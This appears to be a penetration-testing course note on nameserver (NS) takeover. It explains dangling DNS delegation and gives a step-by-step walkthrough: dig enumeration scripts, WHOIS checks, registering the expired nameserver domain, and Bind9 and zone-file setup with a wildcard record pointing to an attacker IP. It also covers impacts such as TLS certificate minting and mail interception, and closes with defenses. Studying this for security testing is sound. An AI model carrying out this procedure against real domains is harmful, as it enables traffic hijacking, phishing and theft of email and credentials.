---
tags: [vapt, subdomain-takeover, dns, nameserver, advanced]
difficulty: advanced
module: "34 - Subdomain Takeover"
topic: "34.05 NS Takeover"
---

# NS Takeover: Seizing Control of DNS Delegation

## 1. Introduction to NS Takeover
Nameserver (NS) Takeover is an advanced, highly critical, and often overlooked variant of subdomain takeover. While standard subdomain takeovers (like CNAME takeovers) usually involve claiming a dangling pointer to a specific PaaS/SaaS provider resource, an NS takeover involves exploiting dangling NS (Name Server) records themselves. 

When a subdomain is delegated to a specific set of nameservers, the parent zone instructs all global DNS resolvers that any queries for that subdomain (and absolutely all of its child subdomains) should be directed to those specific external nameservers. If the domain name of one of these delegated nameservers expires, is abandoned, and becomes available for registration on the open market, an attacker can purchase the nameserver domain. By setting up their own DNS server on this newly acquired domain, they achieve absolute, authoritative control over the target subdomain and its entire namespace hierarchy.

This vulnerability provides the attacker with much deeper, more fundamental access than a standard CNAME takeover. Instead of controlling a single endpoint, the attacker controls the map itself. They can forge A, AAAA, MX, TXT, SRV, and CNAME records arbitrarily for the affected zone, bypassing almost all network-level protections.

## 2. The Mechanics of DNS Delegation and Zone Files
To fully understand NS takeovers, one must understand DNS zones, delegation, and how authoritative servers operate. 

Consider a large target company, `target.com`. Their engineering team wants to manage the infrastructure for the `dev.target.com` environment independently. Instead of managing all these volatile development records in the main `target.com` corporate zone file (which might require slow, bureaucratic IT tickets to update), the corporate DNS administrator delegates the authority for `dev.target.com` to external nameservers managed by the dev team or a third-party vendor.

The primary `target.com` zone file would contain NS records like this:
```text
; Delegation for the dev environment
dev.target.com.  86400  IN  NS  ns1.dev-infra-hosting.com.
dev.target.com.  86400  IN  NS  ns2.dev-infra-hosting.com.
```

This tells the internet: "For anything ending in `.dev.target.com`, go ask `ns1.dev-infra-hosting.com` or `ns2.dev-infra-hosting.com`."

If the third-party company `dev-infra-hosting.com` goes out of business, changes their primary domain, or simply forgets to renew their domain, the domain expires. However, the corporate `target.com` zone file remains unchanged, still pointing to `ns1.dev-infra-hosting.com`. The delegation is now considered "dangling."

## 3. Attack Flow Architecture and Request Lifecycle

```text
                                [ THE NS TAKEOVER ATTACK CHAIN ]

  [ Legitimate User / System ]                        [ Target.com Primary DNS ]
           |                                                      |
           | 1. Query: A record for api.dev.target.com            |
           |----------------------------------------------------->|
           |                                                      |
           | 2. Response: "I don't know the A record, but the     |
           |    authority for dev.target.com is at these NS:      |
           |    ns1.dev-infra-hosting.com"                        |
           |<-----------------------------------------------------|
           |
           |
           | 3. Query: A record for api.dev.target.com
           |    Destination: ns1.dev-infra-hosting.com
           |-----------------------------------------------------> [ Attacker's Rogue DNS Server ]
                                                                     (Attacker actively registered the expired
                                                                      domain dev-infra-hosting.com via Namecheap)
                                                                                  |
                                                                                  | 4. Attacker's custom Bind9 Zone File
                                                                                  |    intercepts the query and resolves
                                                                                  |    api.dev.target.com to the
                                                                                  |    attacker's malicious server IP.
                                                                                  |
           | 5. Authoritative Response:                           |
           |    api.dev.target.com IN A 198.51.100.99             |
           |<---------------------------------------------------------------------+
           |
  [ User's Browser / API Client ]
  Connects to 198.51.100.99 fully believing it is communicating with
  the legitimate, trusted api.dev.target.com infrastructure.
```

## 4. Vulnerability Conditions and Prerequisites
An NS Takeover is possible only when a specific confluence of misconfigurations occurs:
1. **Dangling Delegation:** A subdomain has NS records pointing to a fully qualified domain name (FQDN) of a nameserver.
2. **Domain Availability:** The FQDN of the targeted nameserver is currently unregistered, expired, or actively available for public purchase at a domain registrar.
3. **Lack of Redundancy/Failover Logic:** If multiple NS records exist (e.g., `ns1.valid.com` and `ns1.expired.com`), DNS resolvers will query them pseudo-randomly or based on lowest latency. If an attacker controls just ONE of the nameservers in the list, they will intermittently receive a portion of the DNS traffic. While controlling all nameservers guarantees 100% traffic interception, controlling even one is sufficient for a critical exploit, as it leads to unpredictable and intermittent hijacking of users.

## 5. Step-by-Step Exploitation Walkthrough

### Phase 1: Identifying Dangling NS Records at Scale
We begin by actively enumerating subdomains and explicitly requesting their NS records. Because large organizations have thousands of subdomains, automation is key.

Using `dig` manually to check a specific delegation:
```bash
dig NS dev.target.com +short
```
Expected vulnerable output:
```text
ns1.old-startup-service.net.
ns2.old-startup-service.net.
```

Automating this across a massive list of discovered subdomains using a quick bash script:
```bash
#!/bin/bash
cat all_subdomains.txt | while read sub; do
  ns_records=$(dig NS $sub +short | grep -v '^\.')
  if [ ! -z "$ns_records" ]; then
    echo -e "[\033[1;32m*\033[0m] Subdomain: $sub"
    echo "$ns_records" | while read ns; do
      echo "    -> NS: $ns"
    done
  fi
done > ns_delegations_map.txt
```

### Phase 2: Domain Availability and WHOIS Check
Once we map out the nameservers, we must rigorously verify if the nameserver domains (e.g., `old-startup-service.net`) are available for registration. We use bulk WHOIS lookups or registrar APIs to avoid rate limits.

```bash
whois old-startup-service.net | egrep -i "No match for|not found|Status: free"
```
If the output confirms the domain is completely unregistered and available, the vulnerability is fully confirmed and ready for exploitation.

### Phase 3: Registering the Base Domain
The attacker immediately logs into a commercial domain registrar (Namecheap, GoDaddy, AWS Route53) and purchases the base domain `old-startup-service.net`. The financial cost is typically negligible ($10-$15 per year), making the barrier to entry incredibly low for such a high-impact exploit.

### Phase 4: Setting up a Rogue DNS Server and Glue Records
Once the domain is owned, the attacker must act as the authoritative nameserver.
1. The attacker provisions a cloud Virtual Private Server (VPS) with a static IP (e.g., `198.51.100.10`).
2. At the domain registrar, the attacker creates "Glue Records" or custom nameservers, mapping `ns1.old-startup-service.net` and `ns2.old-startup-service.net` to their VPS IP `198.51.100.10`.
3. The attacker SSH's into the VPS and installs a robust DNS server daemon, such as `Bind9`, `PowerDNS`, or `CoreDNS`.

**Bind9 Configuration Example (`/etc/bind/named.conf.local`):**
```text
zone "dev.target.com" {
    type master;
    file "/etc/bind/zones/db.dev.target.com";
};
```

### Phase 5: Crafting the Malicious Zone File
The attacker creates the zone file to dictate the reality of the `dev.target.com` namespace. They can define any records they desire.

**Zone File (`/etc/bind/zones/db.dev.target.com`):**
```text
$TTL    604800
@       IN      SOA     ns1.old-startup-service.net. admin.old-startup-service.net. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      ns1.old-startup-service.net.
@       IN      A       198.51.100.20   ; Attacker's web server for base subdomain

; Forging records for specific child subdomains
api     IN      A       198.51.100.20   ; Takeover api.dev.target.com
mail    IN      A       198.51.100.20   ; Takeover mail.dev.target.com

; Wildcard record to catch absolutely ALL unknown traffic
*       IN      A       198.51.100.20   ; Catch-all for any child subdomain!
```

After reloading the Bind9 service (`systemctl reload bind9`), the attacker now completely controls `dev.target.com` and absolutely everything beneath it in the DNS tree.

## 6. Deep Dive: Impact and Severity
The severity of an NS takeover far exceeds a standard CNAME takeover. It is an infrastructure-level compromise.
1. **Total Namespace Control:** The attacker can create infinite, highly trusted subdomains (`vpn-gateway.dev.target.com`, `sso-login.dev.target.com`) without the target organization having any visibility into these new records.
2. **SSL/TLS Certificate Generation:** Because the attacker exerts absolute control over the DNS zone, they can easily pass the Let's Encrypt `DNS-01` challenge. They can legitimately generate trusted SSL certificates for any of the target's subdomains, making their malicious phishing or proxy sites appear 100% secure and authentic to modern web browsers, avoiding SSL mismatch warnings.
3. **Email Interception (MX Forgery):** The attacker can define custom MX records for the taken-over zone, capturing any corporate emails inadvertently routed to `@dev.target.com` or `@anything.dev.target.com`. This often leads to capturing sensitive development credentials or automated system alerts.
4. **Traffic Blackholing and DoS:** The attacker can intentionally route traffic to non-existent IPs (e.g., `0.0.0.0`) or loopback addresses, causing a complete and hard-to-diagnose Denial of Service (DoS) for the subdomain and all its legitimate child services.

## 7. Defensive Measures and Best Practices
1. **Continuous DNS Auditing:** Regularly and aggressively audit all authoritative zone files for NS records pointing to external, third-party domains. Treat external NS delegation as a high-risk configuration requiring continuous monitoring.
2. **Automated Expiry Alerts:** If external domains must be used for delegation, monitor their WHOIS expiration dates actively. Alert the security team 30 days before any delegated nameserver domain expires.
3. **Vendor Consolidation:** Avoid delegating to bespoke, unstable, or small third-party nameservers. Prefer delegating within managed enterprise DNS solutions (e.g., delegating from a primary Route53 zone to another restricted Route53 hosted zone within the same AWS Organization).
4. **Defensive Domain Registration:** If a third-party vendor shuts down, proactively purchase their domain name defensively if your DNS still points to it, *before* attempting to remove the records, to prevent race conditions with automated bug bounty hunters.

## 8. Chaining Opportunities
- **[[06 - MX Takeover]]**: Since you control the authoritative NS records, you trivially control the MX records, leading to immediate email interception and passive intelligence gathering.
- **[[04 - Subdomain Takeover — Full Exploit Walkthrough]]**: You can spawn your own CNAME records to perform traditional takeovers or redirect traffic to complex exploit chains.
- **[[15 - SSL Stripping & Forgery]]**: Use the ability to pass DNS-01 challenges to mint valid TLS certificates for sophisticated Man-in-the-Middle (MitM) attacks or establishing trusted phishing domains.
- **[[14 - Account Takeover (ATO)]]**: Intercept password reset emails routed through your forged MX records for services associated with the hijacked zone.

## 9. Related Notes
- [[01 - DNS Fundamentals]]
- [[03 - CNAME Takeovers]]
- [[09 - Advanced DNS Exploitation]]
- [[19 - Email Spoofing & DMARC]]
